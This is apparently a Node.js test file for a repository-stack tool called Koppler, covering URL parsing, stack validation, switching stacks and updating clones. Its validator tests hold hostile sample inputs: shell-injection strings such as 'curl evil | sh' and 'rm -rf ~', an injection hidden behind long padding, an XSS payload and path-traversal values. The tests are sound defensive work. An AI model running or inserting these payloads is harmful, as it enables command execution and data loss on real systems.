import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
// Its own folders, set before the sync module loads: these tests switch stacks, which moves the run files of the stack in use.
const sandbox = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-switch-'));
process.env.KOPPLER_TEMP = path.join(sandbox, 'temp'); process.env.KOPPLER_CONFIG_DIR = path.join(sandbox, 'config');
fs.mkdirSync(process.env.KOPPLER_TEMP); fs.mkdirSync(process.env.KOPPLER_CONFIG_DIR);
const { branchList, hostOwners, missingCalls, remoteKey, slugMatches } = await import('../dist/engine/sync.js');
const { validateStack } = await import('../dist/core/stack.js');

assert.equal(remoteKey('git@github.com:acme/orders-api.git'), 'github.com/acme/orders-api');
assert.equal(remoteKey('https://github.com/Acme/Orders-API/'), 'github.com/acme/orders-api');
// A stray % in an address is no reason to stop reading the other repos.
assert.equal(remoteKey('https://git.acme.dev/team/100%-done.git'), 'git.acme.dev/team/100%-done');
assert.equal(remoteKey('ssh://git@github.com/acme/x.y'), 'github.com/acme/x.y');
assert.equal(remoteKey('https://user@gitlab.com/group/sub/repo.git'), 'gitlab.com/group/sub/repo');
assert.equal(remoteKey('ssh://git@git.acme.dev:2222/team/app.git'), 'git.acme.dev/team/app');
assert.equal(remoteKey('git@bitbucket.org:acme/app.git'), 'bitbucket.org/acme/app');
assert.equal(remoteKey('https://dev.azure.com/acme/Shop/_git/orders'), 'dev.azure.com/acme/shop/orders');
assert.equal(remoteKey('git@ssh.dev.azure.com:v3/acme/Shop/orders'), 'dev.azure.com/acme/shop/orders');
assert.equal(remoteKey('https://acme.visualstudio.com/Shop/_git/orders'), 'dev.azure.com/acme/shop/orders');
assert.equal(remoteKey('/Users/me/repos/local-only'), null);
assert.equal(remoteKey('file:///tmp/x.git'), null);
assert.equal(remoteKey(undefined), null);

assert.ok(slugMatches('Acme/orders-api', 'github.com/acme/orders-api'));
assert.ok(slugMatches('gitlab.com/group/sub/repo', 'gitlab.com/group/sub/repo'));
assert.ok(!slugMatches('gitlab.com/group/sub/repo', 'github.com/group/sub/repo'));
assert.ok(!slugMatches('acme/orders', 'github.com/acme/orders-api'));
assert.ok(!slugMatches('acme/orders', 'gitlab.com/other/acme/orders'));

const app = { name: 'Orders API', kind: 'dotnet', slug: 'acme/orders-api' };
assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app, web: { ...app, consumes: { orders: {} } } } }), []);
assert.ok(validateStack({ envs: [], apps: {} }).some(e => e.startsWith('envs')));
assert.ok(validateStack({ envs: ['QA'], apps: {} }).some(e => e.startsWith('envs')));
assert.ok(validateStack({ envs: ['qa'], apps: { orders: { name: 'x' } } }).some(e => e === 'apps.orders.kind: required'));
assert.ok(validateStack({ envs: ['qa'], apps: { web: { ...app, consumes: { ghost: {} } } } }).some(e => e.includes('consumes.ghost')));
// Queues: named and typed, and apps only publish to or read queues the stack lists.
assert.deepEqual(validateStack({ envs: ['qa'], queues: { thumbs: { name: 'Thumbnails', type: 'sqs' } }, apps: { orders: { ...app, publishes: { thumbs: {} } }, web: { ...app, reads: { thumbs: { env: ['Q'] } } } } }), []);
assert.deepEqual(validateStack({ envs: ['qa'], queues: { thumbs: { name: 'T', type: 'rabbit' } }, apps: { web: { ...app, reads: { ghost: {} } } } }), ['queues.thumbs.type: one of sqs, sns, eventbridge, kafka, other', 'apps.web.reads.ghost: no such queue under "queues"']);
assert.deepEqual(branchList('refs/heads/develop\nrefs/remotes/origin/HEAD\nrefs/remotes/origin/develop\nrefs/remotes/upstream/feature/a\nrefs/heads/fix/b\n'), ['develop', 'feature/a', 'fix/b']);
assert.deepEqual(branchList(''), []);
const stack = { envs: ['qa'], apps: {
  web: { name: 'Web', kind: 'node', slug: 'a/web', consumes: { orders: { deployed: 'https://orders.qa.acme.dev' } } },
  orders: { name: 'Orders', kind: 'dotnet', slug: 'a/orders', deployedUrl: 'https://orders.qa.acme.dev' },
  pay: { name: 'Pay', kind: 'dotnet', slug: 'a/pay', deployedUrl: 'https://pay.qa.acme.dev' },
  legacy: { name: 'Legacy', kind: 'dotnet', slug: 'a/legacy', deployedUrl: 'https://pay.qa.acme.dev' },
} };
assert.deepEqual(hostOwners(stack).shared, [['pay.qa.acme.dev', ['pay', 'legacy']]]);
const repos = { web: ['src/a.ts:1: fetch("https://orders.qa.acme.dev/x")'], orders: ['appsettings.json:3: "PayUrl": "https://pay.qa.acme.dev"', 'cfg.json:9: "Web": "https://ORDERS.QA.ACME.DEV"'], pay: ['a.cs:2: new Uri("https://orders.qa.acme.dev")'] };
const found = missingCalls(stack, id => repos[id] ?? []);
assert.deepEqual(Object.keys(found), ['pay']);
assert.deepEqual(Object.keys(found.pay), ['orders']);
assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Just orders', version: 1, nodes: { orders: {} } }] }), []);
assert.deepEqual(validateStack({ envs: ['qa', 'prod'], apps: { orders: { ...app, secrets: [{ env: 'DB', type: 'postgres' }], envs: { prod: { secrets: [{ env: 'DB', type: 'oracle' }] } } } } }), ['apps.orders.envs.prod.secrets: type "oracle" is not one Koppler tests (postgres, mysql, redis)']);
assert.deepEqual(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'No version', nodes: { orders: {} } }] }), ['presets[0].version: required (the current preset format is 1)']);
assert.match(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Future', version: 99, nodes: { orders: {} } }] })[0], /newer than this Koppler reads/);
assert.ok(validateStack({ envs: ['qa'], apps: { orders: app }, presets: [{ name: 'Bad', version: 1, nodes: { ghost: {} }, edges: [{ from: 'orders', to: 'ghost' }] }] }).length === 2);
// Shapes that would crash a later step are refused here, each with a reason, and never by throwing.
{
  const stack = extra => ({ envs: ['qa', 'prod'], apps: { orders: app, web: { ...app } }, ...extra }), web = extra => stack({ apps: { orders: app, web: { ...app, ...extra } } });
  for (const [bad, reason] of [
    [web({ consumes: { orders: null } }), /apps\.web\.consumes\.orders/],
    [web({ consumes: { constructor: {} } }), /consumes\.constructor: no such app/],
    [web({ consumes: [] }), /apps\.web\.consumes/],
    [web({ envs: { prod: null } }), /apps\.web\.envs\.prod/],
    [web({ envs: { staging: {} } }), /apps\.web\.envs\.staging: not one of envs/],
    [web({ envs: [] }), /apps\.web\.envs/],
    [web({ kind: 'constructor' }), /kind: "constructor" is not a kind/],
    [web({ publishes: { constructor: {} } }), /publishes\.constructor: no such queue/],
    [web({ prereqs: {} }), /apps\.web\.prereqs: a list/],
    [web({ secrets: 'DB' }), /apps\.web\.secrets: a list/],
    [stack({ apps: { orders: app, web: null } }), /apps\.web/],
    [stack({ envs: ['qa', 'qa'] }), /envs: .*each once/],
    [stack({ presets: {} }), /presets: a list/],
    [stack({ presets: [null] }), /presets\[0\]/],
    [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: null } }] }), /presets\[0\]\.nodes\.orders/],
    [stack({ presets: [{ name: 'P', version: 1, nodes: [] }] }), /presets\[0\]\.nodes/],
    [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: { from: 'orders', to: 'web' } }] }), /presets\[0\]\.edges: a list/],
    [stack({ presets: [{ name: 'P', version: 1, nodes: { orders: {} }, edges: [null] }] }), /presets\[0\]\.edges/],
    [stack({ presets: [{ name: 'P', version: 1, nodes: { constructor: {} } }] }), /nodes\.constructor: no such app/],
    [stack({ queues: [] }), /queues: an object/],
    [stack({ kinds: null }), /kinds: an object/],
  ]) {
    let errors; assert.doesNotThrow(() => { errors = validateStack(bad); }, JSON.stringify(bad));
    assert.match(errors.join('\n'), reason, JSON.stringify(bad));
  }
  assert.deepEqual(validateStack(web({ consumes: { orders: {} }, envs: { prod: { start: 'run' } } })), []);
}
console.log('ok');

// The picker's candidates and adding the picked ones: only clones from the index, never one already in the stack.
{
  const { addApps, candidateRepos, nameFromRepo } = await import('../dist/engine/sync.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  assert.equal(nameFromRepo('acme-wallet-api'), 'Acme Wallet API');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-pick-'));
  const mk = (name, files) => { const d = px.join(dir, 'repos', name); fsx.mkdirSync(d, { recursive: true }); for (const f of files) fsx.writeFileSync(px.join(d, f), '{}'); return d; };
  const index = { roots: [dir], repos: [
    { path: mk('orders-api', ['Orders.csproj']), keys: ['github.com/acme/orders-api'] },
    { path: mk('shop-app', ['pubspec.yaml']), keys: ['github.com/acme/shop-app'] },
    { path: mk('docs', []), keys: ['gitlab.com/acme/team/docs'] },
    { path: px.join(dir, 'gone'), keys: ['github.com/acme/gone'] },
  ] };
  const stackDir = px.join(dir, 'stack'); fsx.mkdirSync(stackDir);
  fsx.writeFileSync(px.join(stackDir, 'stack.json'), JSON.stringify({ name: 'Shop', envs: ['qa'], apps: { 'orders-api': { name: 'Orders', kind: 'dotnet', slug: 'acme/orders-api' } } }));
  const stack = () => JSON.parse(fsx.readFileSync(px.join(stackDir, 'stack.json'), 'utf8'));
  assert.deepEqual(candidateRepos(index, stack(), stackDir).map(c => [c.slug, c.kind, c.inStack ?? null]), [['gitlab.com/acme/team/docs', null, null], ['acme/orders-api', 'dotnet', 'orders-api'], ['acme/shop-app', 'flutter', null]]);
  const opts = { config: { stack: stackDir }, index };
  assert.deepEqual(addApps([{ slug: 'acme/orders-api' }, { slug: 'evil/not-scanned', name: 'x', kind: 'node' }], opts), { added: [] });
  assert.match(addApps([{ slug: 'gitlab.com/acme/team/docs' }], opts).error, /Say what kind of app/);
  assert.deepEqual(addApps([{ slug: 'acme/shop-app', name: '  Shop App  ' }, { slug: 'gitlab.com/acme/team/docs', kind: 'web' }], opts), { added: ['shop-app', 'docs'] });
  assert.deepEqual(stack().apps['shop-app'], { name: 'Shop App', kind: 'flutter', slug: 'acme/shop-app', pending: 'Run facts not collected yet: read the repo (launchSettings/README/infra) and fill run, url, prereqs before using.' });
  assert.equal(stack().apps.docs.kind, 'web');
  assert.deepEqual(validateStack(stack()), []);
  fsx.rmSync(dir, { recursive: true });
  console.log('picker ok');
}

// A new stack: a name and environments, created empty in the user's private config and made the stack in use.
{
  const { createStack } = await import('../dist/engine/sync.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-new-')), config = {};
  for (const [bad, why] of [[{ name: ' ', envs: 'qa' }, /Give the stack a name/], [{ name: 'X', envs: '' }, /at least one environment/], [{ name: 'X', envs: 'QA!, prod' }, /lowercase letters/]]) assert.match(createStack(bad, { config: {}, dir, save() {} }).error, why);
  const made = createStack({ name: '  Orders Platform ', envs: 'QA, prod  qa' }, { config, dir, save() {} });
  assert.equal(made.stack, px.join(dir, 'orders-platform'));
  assert.deepEqual(JSON.parse(fsx.readFileSync(px.join(made.stack, 'stack.json'), 'utf8')), { name: 'Orders Platform', envs: ['qa', 'prod'], apps: {} });
  assert.deepEqual(validateStack(JSON.parse(fsx.readFileSync(px.join(made.stack, 'stack.json'), 'utf8'))), []);
  assert.equal(config.stack, made.stack);
  assert.match(createStack({ name: 'orders platform', envs: ['qa'] }, { config: {}, dir, save() {} }).error, /already have a stack called/);
  fsx.rmSync(dir, { recursive: true });
  console.log('new stack ok');
}

// Stacks already on the Mac can be used from the empty state; a folder Koppler did not find cannot.
{
  const { knownStacks, useStack } = await import('../dist/engine/sync.js');
  const fsx = await import('node:fs'), osx = await import('node:os'), px = await import('node:path');
  const dir = fsx.mkdtempSync(px.join(osx.tmpdir(), 'koppler-use-')), repo = px.join(dir, 'team-repo'), shared = px.join(repo, 'stacks', 'shop');
  fsx.mkdirSync(shared, { recursive: true });
  fsx.writeFileSync(px.join(shared, 'stack.json'), JSON.stringify({ name: 'Shop', envs: ['qa', 'prod'], apps: { api: { name: 'API', kind: 'node', slug: 'acme/api' } } }));
  fsx.mkdirSync(px.join(repo, 'stacks', 'broken')); fsx.writeFileSync(px.join(repo, 'stacks', 'broken', 'stack.json'), '{"apps": []}');
  const index = { repos: [{ path: repo, keys: ['github.com/acme/team-repo'] }] }, config = {};
  const found = knownStacks(index).filter(s => s.dir.startsWith(dir));
  assert.deepEqual(found.map(s => [s.name, s.apps, s.envs.join(), s.shared]), [['Shop', 1, 'qa,prod', true]]);
  assert.match(useStack('/etc', { config, index, save() {} }).error, /not a stack Koppler found/);
  assert.deepEqual(useStack(shared, { config, index, save() {} }), { stack: shared });
  assert.equal(config.stack, shared);
  fsx.rmSync(dir, { recursive: true });
  console.log('use stack ok');
}

// Switching stacks puts one stack's board, history and log away and brings the other's back.
{
  const { setStack, stackKey } = await import('../dist/engine/sync.js');
  const fsx = await import('node:fs'), px = await import('node:path');
  const temp = process.env.KOPPLER_TEMP;
  if (temp && temp.includes('koppler-switch-')) {
    const config = { stack: '/stacks/a' };
    fsx.writeFileSync(px.join(temp, 'state.json'), 'board A'); fsx.writeFileSync(px.join(temp, 'history.jsonl'), 'history A'); fsx.writeFileSync(px.join(temp, 'registry.json'), 'shared');
    setStack(config, '/stacks/b', () => {});
    assert.equal(config.stack, '/stacks/b');
    assert.equal(fsx.existsSync(px.join(temp, 'state.json')), false);
    assert.equal(fsx.readFileSync(px.join(temp, 'stacks', stackKey('/stacks/a'), 'state.json'), 'utf8'), 'board A');
    assert.equal(fsx.readFileSync(px.join(temp, 'registry.json'), 'utf8'), 'shared');
    fsx.writeFileSync(px.join(temp, 'state.json'), 'board B');
    setStack(config, '/stacks/a', () => {});
    assert.deepEqual([fsx.readFileSync(px.join(temp, 'state.json'), 'utf8'), fsx.readFileSync(px.join(temp, 'history.jsonl'), 'utf8')], ['board A', 'history A']);
    setStack(config, '/stacks/a', () => {});
    assert.equal(fsx.readFileSync(px.join(temp, 'state.json'), 'utf8'), 'board A');
    // A remembered change must name a file inside the app's clone.
{
  const base = { envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a' } } };
  const withChange = file => ({ ...base, apps: { a: { ...base.apps.a, localChanges: [{ file, find: 'x', replace: 'y' }] } } });
  assert.deepEqual(validateStack(withChange('src/a.js')), []);
  for (const bad of ['../x', '/etc/hosts', 'a/../../x']) assert.match(validateStack(withChange(bad)).join(), /localChanges\[0\]/, bad);
}
    // A tunnel's port must be a number: it reaches the page, shell commands and the port probe.
{
  const st = port => ({ envs: ['qa', 'prod'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a', prereqs: [{ tunnel: 'db.acme.dev', port }], envs: { prod: { prereqs: [{ tunnel: 'db.acme.dev', port }] } } } } });
  assert.deepEqual(validateStack(st(5432)), []);
  assert.equal(validateStack(st('5432"><img src=x onerror=alert(1)>')).length, 2);
  assert.match(validateStack(st(70000)).join(), /prereqs\[0\]\.port/);
}
    // Values that end up in commands must look like what they are.
{
  const st = (prereq, extra = {}) => ({ envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'acme/a', prereqs: [prereq], ...extra } } });
  assert.deepEqual(validateStack(st({ tunnel: 'db.acme.dev', port: 5432, connectsAs: 'db-1.internal', env: 'ConnectionStrings__Db' })), []);
  assert.deepEqual(validateStack(st({ sso: 'acme-qa' })), []);
  for (const [bad, field] of [[{ tunnel: 'db.acme.dev; touch /tmp/x #' }, 'tunnel'], [{ connectsAs: 'x" && rm -rf ~' }, 'connectsAs'], [{ hosts: 'a b' }, 'hosts'], [{ sso: 'qa; curl x' }, 'sso'], [{ env: 'A=$(id)' }, 'env']])
    assert.match(validateStack(st(bad)).join(), new RegExp(`prereqs\\[0\\]\\.${field}`), field);
  assert.match(validateStack(st({}, { slug: 'acme/a.git; curl evil | sh #' })).join(), /slug/);
  assert.match(validateStack(st({}, { secrets: [{ env: 'DB URL' }] })).join(), /secrets\[0\]\.env/);
  assert.match(validateStack({ ...st({}), queues: { q: { name: 'Q', type: 'sqs', queue: 'x; rm' } } }).join(), /queues\.q\.queue/);
}
// What gets approved is what runs: nothing is cut short, so over-long or over-many checks and commands are refused.
{
  const base = { envs: ['qa'], apps: { a: { name: 'A', kind: 'other', slug: 'acme/a', start: 'make run' } } };
  assert.deepEqual(validateStack({ ...base, checks: [{ name: 'vpn', run: 'pgrep -x vpnd' }] }), []);
  assert.match(validateStack({ ...base, checks: [{ name: 'vpn', run: `true ${'#'.repeat(2000)}; curl evil | sh` }] }).join(), /checks\[0\]/);
  assert.match(validateStack({ ...base, checks: Array.from({ length: 51 }, (_, n) => ({ name: `c${n}`, run: 'true' })) }).join(), /at most 50/);
  assert.match(validateStack({ ...base, apps: { a: { ...base.apps.a, start: 'x'.repeat(2001) } } }).join(), /apps\.a\.start/);
}
// `protected` names environments the stack has.
{
  const st = p => ({ envs: ['qa', 'prod'], protected: p, apps: {} });
  assert.deepEqual(validateStack(st(['prod'])), []);
  assert.match(validateStack(st(['production'])).join(), /protected/);
  assert.match(validateStack(st('prod')).join(), /protected/);
}
console.log('switch stacks ok');
  }
}

// Updating clones: fetch, then fast-forward only a clean branch that is simply behind.
{
  const { updateAction, updateClones } = await import('../dist/engine/sync.js');
  assert.equal(updateAction({ upstream: null, dirty: 0, ahead: 0, behind: 3 }), 'no-upstream');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 0, behind: 0 }), 'current');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 0, behind: 2 }), 'fast-forward');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 1, ahead: 0, behind: 2 }), 'dirty');
  assert.equal(updateAction({ upstream: 'origin/main', dirty: 0, ahead: 1, behind: 2 }), 'diverged');

  const { execFileSync: sh } = await import('node:child_process');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-fetch-'));
  const git = (cwd, ...args) => sh('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...args], { cwd, encoding: 'utf8' }).trim();
  const origin = path.join(dir, 'origin'), clean = path.join(dir, 'clean'), dirty = path.join(dir, 'dirty');
  fs.mkdirSync(origin); git(origin, 'init', '-q', '-b', 'main'); fs.writeFileSync(path.join(origin, 'a.txt'), '1'); git(origin, 'add', '.'); git(origin, 'commit', '-qm', 'one');
  git(dir, 'clone', '-q', origin, clean); git(dir, 'clone', '-q', origin, dirty);
  fs.writeFileSync(path.join(origin, 'a.txt'), '2'); git(origin, 'commit', '-qam', 'two');
  fs.writeFileSync(path.join(dirty, 'mine.txt'), 'work in progress');
  fs.writeFileSync(path.join(process.env.KOPPLER_TEMP, 'local.json'), JSON.stringify({ apps: { clean: { path: clean, branch: 'main' }, dirty: { path: dirty, branch: 'main' }, gone: null } }));
  const lines = []; const log = console.log; console.log = l => lines.push(l);
  try { await updateClones(); } finally { console.log = log; }
  assert.equal(fs.readFileSync(path.join(clean, 'a.txt'), 'utf8'), '2', 'a clean clone that is behind is fast-forwarded');
  assert.equal(fs.readFileSync(path.join(dirty, 'a.txt'), 'utf8'), '1', 'a clone with uncommitted work is left alone');
  assert.equal(fs.readFileSync(path.join(dirty, 'mine.txt'), 'utf8'), 'work in progress');
  assert.ok(lines.some(l => /^UPDATED clean: main \+1/.test(l)), lines.join('\n'));
  assert.ok(lines.some(l => /^BEHIND dirty: main is 1 behind .*uncommitted/.test(l)), lines.join('\n'));
  fs.rmSync(dir, { recursive: true, force: true });
}

// Removing an app: its entry and other apps' calls to it go; nothing else changes.
{
  const { removeApp } = await import('../dist/engine/sync.js');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-remove-'));
  fs.writeFileSync(path.join(dir, 'stack.json'), JSON.stringify({ name: 'S', envs: ['qa'], apps: { a: { name: 'A', kind: 'node', slug: 'x/a', consumes: { b: { how: 'env' }, c: { how: 'env' } } }, b: { name: 'B', kind: 'node', slug: 'x/b' }, c: { name: 'C', kind: 'node', slug: 'x/c' } }, presets: [{ name: 'P', nodes: { a: {}, b: {} }, edges: [] }] }));
  assert.deepEqual(removeApp('b', { config: { stack: dir } }), { removed: 'b', name: 'B' });
  const after = JSON.parse(fs.readFileSync(path.join(dir, 'stack.json'), 'utf8'));
  assert.deepEqual(Object.keys(after.apps), ['a', 'c']);
  assert.deepEqual(Object.keys(after.apps.a.consumes), ['c']);
  assert.deepEqual(after.presets[0].nodes, { a: {}, b: {} });
  assert.match(removeApp('zzz', { config: { stack: dir } }).error, /not in the stack/);
  fs.rmSync(dir, { recursive: true, force: true });
}
